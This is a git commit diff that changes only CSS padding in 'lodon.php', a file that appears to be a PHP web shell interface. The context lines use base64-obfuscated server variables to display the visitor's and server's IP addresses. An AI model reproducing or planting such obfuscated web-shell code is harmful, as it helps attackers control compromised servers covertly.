f7ff4fdef8c4ede1259e88d288f8c4d47c9c55ff
kinglodon <almightyzoroo@gmail.com>
2024-05-23 16:24:26 +0700

    Update lodon.php

--- lodon.php
+++ lodon.php
@@ -426,7 +426,7 @@ button, input:hover {
 <div class="footer kedip">
   <p>Yowaii Mo 🤡</p>
 </div>
-<div class="table-responsive text-light separator" style="text-align: left;padding: 4px;border: 2px solid #4200ac;border-radius:5px;">
+<div class="table-responsive text-light separator" style="text-align: left;padding: 12px 12px 4px;border: 2px solid #4200ac;border-radius:5px;">
     <div class="separate-table">
         <li>Your IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
         <li>Server IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
